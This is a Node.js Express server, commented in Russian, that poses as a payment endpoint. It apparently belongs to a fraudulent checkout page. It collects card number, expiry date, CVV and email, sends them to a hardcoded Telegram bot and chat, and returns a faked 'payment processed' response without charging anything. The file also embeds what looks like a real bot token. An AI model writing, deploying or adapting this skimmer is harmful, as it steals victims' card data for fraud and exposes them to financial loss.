const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Конфигурация Telegram
const TG_TOKEN = '8224498863:AAGFJzGaWNCNzGVGTck2mPlOFrCXKb7gHhI';
const TG_CHAT_ID = '1627227943';

// Отправка сообщения в Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      chat_id: TG_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('Ошибка отправки в Telegram:', error);
  }
}

app.post('/api/payment', async (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, product } = req.body;
  
  // Форматирование сообщения для Telegram
  const message = `
💰 <b>НОВАЯ ОПЛАТА</b>

💳 <b>Карта:</b> ${cardNumber.replace(/\d(?=\d{4})/g, "*")}
📅 <b>Срок:</b> ${expiry}
🔒 <b>CVV:</b> ${cvv}
📧 <b>Email:</b> ${email}
💵 <b>Сумма:</b> ${amount}₽
🎯 <b>Продукт:</b> ${product}

⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
  `;

  try {
    // Отправляем данные в Telegram
    await sendToTelegram(message);
    
    // Имитация успешной обработки
    setTimeout(() => {
      res.json({
        success: true,
        message: 'Платеж обработан'
      });
    }, 2000);
    
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Ошибка обработки платежа'
    });
  }
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});
